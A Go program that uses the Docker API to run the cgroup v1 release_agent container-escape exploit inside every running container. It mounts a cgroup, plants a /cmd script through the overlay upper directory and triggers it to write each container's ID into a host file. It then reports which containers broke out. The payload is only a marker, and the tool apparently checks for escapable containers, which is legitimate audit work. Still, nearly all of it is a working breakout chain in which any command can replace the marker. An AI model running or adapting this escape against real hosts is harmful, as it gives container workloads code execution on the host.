package main

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"time"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"
)

func main() {
	filePath := "/tmp/cec"
	// ファイルが存在する場合は削除
	if _, err := os.Stat(filePath); err == nil {
		os.Remove(filePath)
	}

	// 空のファイルを作成
	file, err := os.Create(filePath)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	cli, err := client.NewClientWithOpts(client.FromEnv)
	if err != nil {
		panic(err)
	}

	containers, err := cli.ContainerList(context.Background(), container.ListOptions{})
	if err != nil {
		panic(err)
	}

	containerIDs := make([]string, len(containers))

	for i, container := range containers {
		containerIDs[i] = container.ID
		fmt.Printf("Container ID: %s\n", container.ID)
		commands := [][]string{
			{"sh", "-c", `mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x`},
			{"sh", "-c", `echo 1 > /tmp/cgrp/x/notify_on_release`},
			{"sh", "-c", `echo '#!/bin/sh\necho "` + container.ID + `" >> /tmp/cec' > /cmd && chmod +x /cmd`},
			{"sh", "-c", `echo "$(mount | grep overlay2 | grep -oP 'upperdir=\K[^,]*')/cmd" > /tmp/cgrp/release_agent`},
			{"sh", "-c", `sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"`},
		}
		for _, cmd := range commands {
			execConfig := types.ExecConfig{
				Cmd: cmd,
			}
			execResp, err := cli.ContainerExecCreate(context.Background(), container.ID, execConfig)
			if err != nil {
				fmt.Fprintf(os.Stderr, "Error creating exec: %v\n", err)
				continue
			}

			err = cli.ContainerExecStart(context.Background(), execResp.ID, types.ExecStartCheck{})
			if err != nil {
				fmt.Fprintf(os.Stderr, "Error starting exec: %v\n", err)
				continue
			}
		}
	}

	// 1秒待機
	time.Sleep(1 * time.Second)

	file, err = os.Open(filePath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	lines := []string{}
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	for i, containerID := range containerIDs {
		for j, line := range lines {
			if line == containerID {
				fmt.Printf("Match found at index %d (file line %d): %s\n", i, j, containerID)
				break
			}
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading file:", err)
	}

}
